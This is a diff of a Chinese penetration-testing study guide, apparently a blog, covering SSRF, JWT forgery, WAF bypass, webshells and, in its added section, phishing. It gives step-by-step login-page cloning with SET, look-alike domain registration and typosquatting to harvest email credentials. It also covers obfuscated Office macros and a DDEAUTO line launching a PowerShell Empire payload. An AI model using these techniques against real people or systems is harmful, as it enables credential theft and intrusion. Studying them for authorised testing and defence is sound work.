+>  扫描内部网络和与这些服务的潜在交互方式GET/POST/HEAD）
+>   使用 FILE:// 读取服务器上的本地文件
+> 使用 AWS Rest 接口（ http://bit.ly/2ELv5zZ ）
+>  横向移动到内部环境中
+>  还可以利用其漏洞打穿内网添加管理员或远程下载一个木马
+
 找真实站点搜索关键词：上传网络图片  
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711014602709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-你甚至还可以利用其漏洞打穿内网添加管理员或远程下载一个木马
 
-### 常见攻击演示
+### 常见攻击
+如果对方的网站可以直接链接到别的网站的入口，而本身界面又还是自身网站就可能存在此漏洞
 
 #### 图片上传
 
@@ -3331,7 +3400,7 @@ fuzzy https://xssfuzzer.com/fuzzer.html
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711020338432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 除了探测信息以外，你要是发现漏洞了还可以直接执行漏洞代码
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210711024415355.png)
-
+跑完ip再跑端口。
 通常你在测试图片上传时会测试以下几种类型的反馈结果
 http://对方内网ip/phpmyadmin
 dict://对方内网ip:3306/info
@@ -3339,7 +3408,7 @@ ftp://对方内网ip:21
 
 
 ## DDOS 攻击
-常见的方案是通过耗尽目标对象资源来达到攻击效果,攻击类型与扫描方法类似
+即分布式拒绝服务（DDoS，Distributed Denial of Service） 攻击。此攻击是通过耗尽目标对象资源来达到攻击效果,攻击类型与扫描方法类似
 
 
 
@@ -3384,182 +3453,10 @@ autoSubTakeover
 ### HTTP劫持
 
 ### DLL劫持
-# 经验积累
 
-## 中间件
-
-### IIS
-IIS是只适用于windows的中间件
-**待补充：漏洞**
-PROPFIND 栈溢出漏洞
-RCE CVE-2017-7269
-PUT任意文件写入
-### Apache
-### Nginx
-### tomcat
-
-## CMS特性
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071520534055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-知名的第三方工具网上是有专门的扫描器的，这相比于通用的扫描得会更及时更经常。如果没有你就想办法弄源码下来，弄到之后先采用一键代码设计软件进行扫描漏洞，扫描不出就去看看源码找0day
-
-如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就通常采用常规测试
-
-### 敏感信息搜集
-
-**搜索引擎搜敏感词**
-框架+爆破目录
-框架+漏洞利用/拿shell
-框架+弱口令
-
-**github**
-框架+历史漏洞 github
-框架github看发布修复了哪些漏洞，就大概能对历史漏洞有全貌了解
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718135824694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-发现相关漏洞之后进入commit就知道这个漏洞到底发生在哪些语句
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-### 工具
-#### 利用
-
-wordpress:wpscan(kali内置)
-thinkphp:thinkphppayload
-
-#### 弱口令
-
-snetcraker:国内开发的，使用起来简单,但仅支持远程协议的爆破破解如mysql，redis等。如果是网页登录需要用burpsuit爆破提交数据包的
-hydra:国外开发的，kali集成
-
-### thinkphp5
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071812320635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-启动界面如图所示  :）![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718123314499.png)
-
-#### 特性
-
-**访问调用**
-支持在url访问文件的函数，写法是url/文件名（如果是index.php可以省略不写）/目录
-/类名（没有类可忽略）/函数名
-支持在url访问文件的参数，写法是url/文件名/目录
-/类名（没有类名可忽略）/函数名/参数名/1
-
-以上方法定义的访问一般至少网页url层有3层。如果是定义路由route文件,重新自定义了访问，访问就更隐蔽了，如下是一个route.php文件的定义。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718132543794.png)
-
-
-利用好上述特性，你在访问时就可以直接调用内在函数
-
-**开启调试模式**
-直接在config中就可以开启调试，这为审计提供了便利。一般在审计时通常会开启，开启方法很简单都以下两个值都设置为true
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718130329347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718133002578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-****
-
-利用tp5的特性在代码审计时，应先查看route文件，再将调试打开，以最快的定位页面文件位置
-
-#### 历史漏洞
-
-tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln
-
-
-### dedecms
-
-#### 基本信息
-
-介绍市场份额、经典界面、漏洞、平台更新速度、版本差别
-
-#### 敏感信息
-
-**后台目录**
-/dede
-更多请看http://wap.dedexuexi.com/dedejiaocheng/azsy/1136.html
-
-
-## 语言特性
-
-### PHP
-
-
-
-#### 变量覆盖漏洞
-
-顾名思义，自定义的变量替换原有变量的情况称为变量覆盖漏洞
-
-主要涉及的函数有以下四个：
-
-```bash
-extract() 
-parse_str() 
-import request variables() 
-$$
-```
-
-如果GET的传参允许被变量，那么通常会配合文件包含或SQL注入拿到隐秘的东西。比如metinfo有类似的漏洞。
-
-extract()函数导致的变量覆盖
-extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每一个元素，将在当前符号表中创建对应的一个变量
-
-parse_str函数导致的变量覆盖问题
-parse_str()函数用于把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量
-将覆盖已存在的变量名
-
-import_request_variables()使用不当
-import_request_variables将GET/POST/COOKIE变量导入到全局作用域中
-import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候 
-
-### JAVAWEB
-
-更多请查看《攻击javaweb应用》
-
-#### 与SQL注入有关的预编译
-
-在SQL注入中java要比PHP漏洞少得多，因为其数据库查询通常会写成预编译。
-
-**预编译**
-一般JAVA中常见预编译，不过其他语言也是可以写出来的
-使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。如下图当java定义接收的参数为？这就代表使用了预编译。注释的就是没有预编译的，通常就可能存在安全漏洞
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718143651696.png)
-
-在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已
-
-case when带入SQL语句可以绕过，但这种只有对方服务器源代码有order by才能奏效。含有order by的网页一般都有排序功能。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)
-
-#### JSON WEB TOKEN
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714150644539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714181545725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-JWT产生在数据包中的数据验证里比如cookie中某参数。
-一般你看到的就是加密后的JWT文件，如下：
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714163343807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值，加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714180644797.png)
-
-JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
-
-#####  破解
-
-**对方服务器允许签名为空**
-将头部解密之后值改为none（改为none即不要密钥的意思），在进行编码成base64，声明值看你是否需要修改相应参数来确定是否修改，（一般会修改用户名和身份过期时间的时间戳），删除签名。如果你是GET请求的数据包你在修改时应充分考虑base64特殊字符 + = / 与url编码兼容问题。常见的base64传输的=应该删掉
-
-**爆破密匙**
-爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
-
-1、服务端根据用户登录状态，将用户信息加密到token中，返给客户端
-2、客户端收到服务端返回的token，存储在cookie中
-3、客户端和服务端每次通信都带上token，可以放在http请求头信息中，如：Authorization字段里面
-4、服务端解密token，验证内容，完成相应逻辑
-
-
-
-   JWT进行破解，对令牌数据进行破解
-
-
-
+# 绕过检测
+你虽然总希望一开始就万剑闪过的绕过防御，但你总不是这么幸运的，通常要不断的尝试。在内网渗透时有时候你还可以故意用一个出名的如Mimikatz来留下痕迹，进而开始触发报警，蓝队在发现我们使用的默认/基础恶意软件（或者仅仅进行了轻微的混淆）时就会将此视为胜利，但我们的真正目的是了解他们的环境。
+## 待补充：免杀
 ## WAF绕过
 
 很多web都有WAF，会对恶意访问者做一定的拦截和记录。你在测试你的危险语句时，遭遇waf第一步是不要惊慌，一点一点的测试是因为匹配到了语句中的哪个词组或符号组被拦截了。
@@ -3798,6 +3695,190 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 
 
 
+# 经验积累
+
+## 中间件
+中间件即是一种独立的系统软件或服务程序，分布式应用软件借助这种软件在不同的技术之间共享资源。
+### IIS
+**介绍**
+IIS是只适用于windows的中间件
+
+**安装**
+如何安装很简单，略。
+但是值得多指出的一点是，这不想装编程语言版本随便切换，就目前的狀況來說，你要用 IIS 8 (非 Express) 就一定要升級到 Windows 8 以上才行，Windows 8.1 是 IIS 8.5，Windows 10 是 IIS 10，因為 IIS 和作業系統是整合的元件，它也沒有釋出可轉散布的安裝檔。
+
+**待补充：漏洞**
+PROPFIND 栈溢出漏洞
+RCE CVE-2017-7269
+PUT任意文件写入
+### Apache
+### Nginx
+### tomcat
+
+## CMS特性
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071520534055.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+知名的第三方工具网上是有专门的扫描器的，这相比于通用的扫描得会更及时更经常。如果没有你就想办法弄源码下来，弄到之后先采用一键代码设计软件进行扫描漏洞，扫描不出就去看看源码找0day
+
+如果对方完全用框架去搭建的，那么它的安全验证/漏洞就会完全来自框架。如果是半开发的漏洞就通常采用常规测试
+
+### 敏感信息搜集
+
+**搜索引擎搜敏感词**
+框架+爆破目录
+框架+漏洞利用/拿shell
+框架+弱口令
+
+**github**
+框架+历史漏洞 github
+框架github看发布修复了哪些漏洞，就大概能对历史漏洞有全貌了解
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718135824694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+发现相关漏洞之后进入commit就知道这个漏洞到底发生在哪些语句
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718140015986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+### 工具
+#### 利用
+
+wordpress:wpscan(kali内置)
+thinkphp:thinkphppayload
+
+#### 弱口令
+
+snetcraker:国内开发的，使用起来简单,但仅支持远程协议的爆破破解如mysql，redis等。如果是网页登录需要用burpsuit爆破提交数据包的
+hydra:国外开发的，kali集成
+
+### thinkphp5
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071812320635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+启动界面如图所示  :）![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718123314499.png)
+
+#### 特性
+
+**访问调用**
+支持在url访问文件的函数，写法是url/文件名（如果是index.php可以省略不写）/目录
+/类名（没有类可忽略）/函数名
+支持在url访问文件的参数，写法是url/文件名/目录
+/类名（没有类名可忽略）/函数名/参数名/1
+
+以上方法定义的访问一般至少网页url层有3层。如果是定义路由route文件,重新自定义了访问，访问就更隐蔽了，如下是一个route.php文件的定义。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718132543794.png)
+
+
+利用好上述特性，你在访问时就可以直接调用内在函数
+
+**开启调试模式**
+直接在config中就可以开启调试，这为审计提供了便利。一般在审计时通常会开启，开启方法很简单都以下两个值都设置为true
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718130329347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718133002578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+****
+
+利用tp5的特性在代码审计时，应先查看route文件，再将调试打开，以最快的定位页面文件位置
+
+#### 历史漏洞
+
+tp5历史漏洞 https://github.com/Mochazz/ThinkPHP-Vuln
+
+
+### dedecms
+
+#### 基本信息
+
+介绍市场份额、经典界面、漏洞、平台更新速度、版本差别
+
+#### 敏感信息
+
+**后台目录**
+/dede
+更多请看http://wap.dedexuexi.com/dedejiaocheng/azsy/1136.html
+
+
+## 语言特性
+
+### PHP
+
+
+
+#### 变量覆盖漏洞
+
+顾名思义，自定义的变量替换原有变量的情况称为变量覆盖漏洞
+
+主要涉及的函数有以下四个：
+
+```bash
+extract() 
+parse_str() 
+import request variables() 
+$$
+```
+
+如果GET的传参允许被变量，那么通常会配合文件包含或SQL注入拿到隐秘的东西。比如metinfo有类似的漏洞。
+
+extract()函数导致的变量覆盖
+extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每一个元素，将在当前符号表中创建对应的一个变量
+
+parse_str函数导致的变量覆盖问题
+parse_str()函数用于把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量
+将覆盖已存在的变量名
+
+import_request_variables()使用不当
+import_request_variables将GET/POST/COOKIE变量导入到全局作用域中
+import_request_variables()函数就是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候 
+
+### JAVAWEB
+
+更多请查看《攻击javaweb应用》
+
+#### 与SQL注入有关的预编译
+
+在SQL注入中java要比PHP漏洞少得多，因为其数据库查询通常会写成预编译。
+
+**预编译**
+一般JAVA中常见预编译，不过其他语言也是可以写出来的
+使用PreparedStatement的参数化的查询可以阻止大部分的SQL注入。如下图当java定义接收的参数为？这就代表使用了预编译。注释的就是没有预编译的，通常就可能存在安全漏洞
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718143651696.png)
+
+在使用参数化查询的情况下，数据库系统不会将参数的内容视为SQL指令的一部分来处理，而是在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有破坏性的指令，也不会被数据库所运行。因为对于参数化查询来说，查询SQL语句的格式是已经规定好了的，需要查的数据也设置好了，缺的只是具体的那几个数据而已
+
+case when带入SQL语句可以绕过，但这种只有对方服务器源代码有order by才能奏效。含有order by的网页一般都有排序功能。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160336287.png)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714160705489.png)
+
+#### JSON WEB TOKEN
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714150644539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714181545725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+JWT产生在数据包中的数据验证里比如cookie中某参数。
+一般你看到的就是加密后的JWT文件，如下：
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714163343807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+JWT分为头部(header)，声明(claims)，签名(signature)，三个部分以英文句号隔开。头部和声明会采用base64加密，签名加密与头部和声明都有关，还要进行整体的sha加密才可以得到最终值，加密方式如下图，对此的解密要用密匙才能解开。如果你还是困惑我表达的意思，你可以访问 https://jwt.io/ 输入一段JWT来交互加解密。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714180644797.png)
+
+JWT攻击取决于对方服务器是接收数据来进行什么样的下一步操作，如果是身份验证那么你就可以做到越权，如果是取数据与SQL语句拼接，那么你就可以做到SQL注入...
+
+#####  破解
+
+**对方服务器允许签名为空**
+将头部解密之后值改为none（改为none即不要密钥的意思），在进行编码成base64，声明值看你是否需要修改相应参数来确定是否修改，（一般会修改用户名和身份过期时间的时间戳），删除签名。如果你是GET请求的数据包你在修改时应充分考虑base64特殊字符 + = / 与url编码兼容问题。常见的base64传输的=应该删掉
+
+**爆破密匙**
+爆破方法是将常用字典一个个当做秘钥，每个秘钥对应着不同的签名，将生成的签名与真实签名进行比较
+
+1、服务端根据用户登录状态，将用户信息加密到token中，返给客户端
+2、客户端收到服务端返回的token，存储在cookie中
+3、客户端和服务端每次通信都带上token，可以放在http请求头信息中，如：Authorization字段里面
+4、服务端解密token，验证内容，完成相应逻辑
+
+
+
+   JWT进行破解，对令牌数据进行破解
+
+
+
+
+
 ## 蜜罐
 蜜罐技术本质上是一种对攻击方进 欺骗的技术，通过布置一些作为诱饵的主机、网络服务以及操作系统等，诱使攻击方对它们实施攻击，从而可以捕获攻击行为进行分析、溯源、反制等操作。
 
@@ -3823,7 +3904,8 @@ sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
 >
 >②伪造反向蜜罐，诱导红队进入并误导溯源并消耗红队的精力
 
-## 木马
+## Webshell
+
 一句话木马是最简单的webshell，基本实现思想是把后门数据包的东西当做恶意代码执行。但很多网站已经对一句话木马做防范了，因此通常这些木马要经过一定变形修改才上传，不然可能被封IP
 
 asp一句话木马：
@@ -3846,9 +3928,7 @@ aspx一句话木马：
 ```
 
 
-待补充：利用msfvenon生成木马、不死马、免杀
-
-
+待补充：利用msfvenon生成木马、不死马
 
 
 
@@ -3949,7 +4029,8 @@ python pydictor.py –sedb
 # 合并去重
 python pydictor.py -tool uniqbiner 你的字典文件夹
 ```
-
+### fuzzy
+国外fuzzy字典https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
 # APP漏洞
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715204256707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -3986,47 +4067,132 @@ APP-> WEB APP->其他 APP->逆向
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629212757948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
+# 待补充：应急响应
 
 # 社会工程学
+社会工程学通常来说技术含量也不高，但有效。
+## 以假乱真
+### 站点伪造
+我学这个网站钓鱼是参考这篇博客，如果你觉得我遗漏了一些细节，请参考这篇博客完成实验[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)
 
-### 套话
+在set>提示符中输入1（Social-Engineering Attacks）并按下回车。
+现在选择Website Attack Vectors（选项2）。
+从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。
+选择Site Cloner（选项2）。
+它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 192.168.56.1。
+下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入http://192.168.56.102/peruggia/index. php?action=login。
+现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。在这里你可能需要生成一个短链来混淆是非，短链生成网站有很多，随便推荐[一个](http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group)
+
+你想做得更多的话：
+
+ - 如果你使用网络攻击在复制完站点后，为达到更加真实效果，进入https://www.freenom.com/zh/index.html?lang=zh申请免费的域名。输入想要的名字默认三个月的使用时间，使用匿名电子邮箱（看我文章有介绍）验证登录
+登陆阿里云，进入dns控制台添加域名，添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器，开启http服务。
+- 把所有图像和资源移到本地（而不是从被克隆的站点调用）
+
+
+
+### 域名伪造
+如果我们的目标公司有 mail.cyberspacekittens.com 这个域名，我们将购买 mailcyberspacekittens.com 这个域名，并设置一个假的 Outlook 页面来获取登录凭证。当受害者进入假网站并输入密码时，我们会收集这些数据并将其重定向到公司的有效电子邮件服务器（mail.cyberspacekittens.com）。这给受害者留下这样的印象：他们只是第一次意外地输错了密码，因此，再次输入正确密码并登录他们的帐户。
+
+这种方法最巧妙地一点是你甚至不用做任何网络钓鱼的操作。因为有些人就是会打错域名或者手误漏掉 “mail” 和 “cyberspacekittens” 之间的点（.），然后进入了错误的网页并输入他们的登录凭证。我们会提示让受害者把我们的恶意网站添加为书签，这样可以让受害者每天都访问我们的恶意网页。
+### who am i
 
 友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”
 
-#### 社交媒体
-
 通过搜索公司的QQ群、钉钉群,伪装成员工获取敏感截图和没被公知的网站
 
-### 钓鱼
+## 钓鱼
+网络钓鱼的秘诀在于激发受害者的恐惧感或者紧迫感，有时也会向受害者描绘一些非常美好(甚至不太真实)的诱惑。
+****
+教育/培养机构
+科研人员：技术交流
+学生：挂科名单
+老师：
+****
+公司
+上班人士：绩效、薪酬、放假通知、惩罚通告、公司福利活动
+管理人员：
+销售：谈合作
+hr:简历
+****
+其他出发点：
+- 新闻。疫情？
+- 购物
+- 软件更新
+- 恐吓。我已经获得了你的邮箱密码，点击链接打钱！
 
-其攻击的目标众多且广泛，包括政府部门、大型国企、金融机构、科研机构以及部分重要的私营企业等。该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。
-宏 – Office
+### 工具
+以下工具选一
+需求自动化选	http://getgophish.com/documentation/
+你熟悉Ruby选	https://github.com/pentestgeek/phishing-frenzy
+你熟悉python选	https://github.com/securestate/king-phisher
+### 钓鱼手段
 DLL劫持
 假冒加固工具
 木马捆绑
+#### 宏 – Office
+虽然是很老旧，但向受害者发送恶意的 Microsoft Office 文件仍然是久经考验的一种社会工程学攻击方法。那为什么 Office 文件非常适合作为恶意 payload 的载体呢？这是因为 Office 文件的默认设置是支持 VBA 代码所以允许 VBA 代码的代码执行。尽管最近这种方法已经很容易被杀毒软件检测到，但在经过混淆处理之后，在很多情况下仍然可以生效。
+
+
+现在，每当有人打开你的文档时，他们都会收到安全警告并看到一个启用内容的按钮。 如果你可以诱导受害者点击“启用内容”的按钮，那么你的 PowerShell 脚本将会被执行，这会弹给你一个 Empire Shell 。
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/5aa3f2c76321493bb5269e08a24289da.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
+
+如前所述，宏文件方法是一种久经考验的旧方法，因此很多受害者已经对这种攻击有了一定的认识。利用 Office 文件的另一种思路是将我们的 payload 嵌入一个批处理文件(.bat)。但在较新版本的 Office 中，如果受害者双击 Word 文档中的 .bat 文件，对象则不会被执行。我们通常不得不试图诱导受害者使其将 .bat 文件移动到桌面并执行。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/bb5d49c642b04e52b37b91252979c1b9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+我们可以用 LuckyStrike 来以更自动化的方式完成此操作。通过使用 LuckyStrike，我们可以在工作表中使用 Payload 创建 Excel 文档，甚至可以在 Excel 文档中存储完整的可执行文件（exe），这些文件可以用 ReflectivePE 来触发从而在内存中运行。阅读更多关于 LuckyStrike 的内容：
+https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator
+
+我想提到的用于 Office 文件执行的最后一个工具是 VBad。运行 VBad 时，必须在 Office 中启用宏，并在宏安全设置的下拉框中选择 “信任对 VBA 项目对象模型的访问” 选项。这会允许 VBad 运行 python 代码来更改并创建宏。
+
+VBad 会严重混淆 MS Office 文档中的 payload。它还增加了加密功能，用假密钥来迷惑应急响应团队。最重要的是，它可以在第一次成功运行后销毁加密密钥（VBad 是一个一次性使用的恶意软件）。另一个特性是 VBad 也可以销毁对包含有效 payload 的模块的引用，以使其从 VBA 开发者工具中不可见。这使得分析和排除故障变得更加困难。因此，不仅很难去逆向，而且如果应急响应团队尝试分析执行的 Word 文档与原始文档，则所有密钥都将丢失。
+![在这里插入图片描述](https://img-blog.csdnimg.cn/acf3c4e334fd4dcdb180b236b13260df.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+#### 非宏的 Office 文件 —— DDE
+ DDE 是全新易受攻击模块。杀毒软件或任何安全产品还尚未检测到它，因此这是获得我们初始入口点的好方法。 虽然现在有几种安全产品可以检测 DDE ，但在某些环境中它仍然可能是一种可行的攻击。
+
+什么是 DDE？
+“ Windows 提供了几种在不同的应用程序之间传输数据的方法。其中一种方法就是使用动态数据交换（DDE）协议。DDE 协议是一组消息和指南。它在共享数据的应用程序之间发送消息，并使用共享内存在应用程序之间交换数据。应用程序可以使用 DDE 协议进行一次性数据传输。并且应用程序也可以利用 DDE 协议来进行持续的数据交换，当新数据可用时候，应用程序可以通过持续的数据交换来彼此发送更新。”https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx
+
+Sensepost 的团队做了一些很棒的研究，发现 MSExcel 和 MSWord 都暴露了 DDEExecute，并且可以在不使用宏的情况下创建代码执行。
+在 Word 中：
+
+转到“插入”选项卡 -> “快速部件” -> “字段”
+选择 = 公式
+右键单击：!Unexpected End of Formula 并选择 Toggle Field Codes
+将 payload 替换为你的 payload：
+
+```bash
+DDEAUTO c:\windows\system32\cmd.exe “/k powershell.exe [empire payload here]”
+```
+![在这里插入图片描述](https://img-blog.csdnimg.cn/004d1be057bf4efe8e590a995d5cdcff.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+Empire 有一个 stager ，可以自动创建 Word 文件和关联的 PowerShell 脚本。 此 stager 可以通过以下方式配置：
+
+usestager windows/macroless_msword
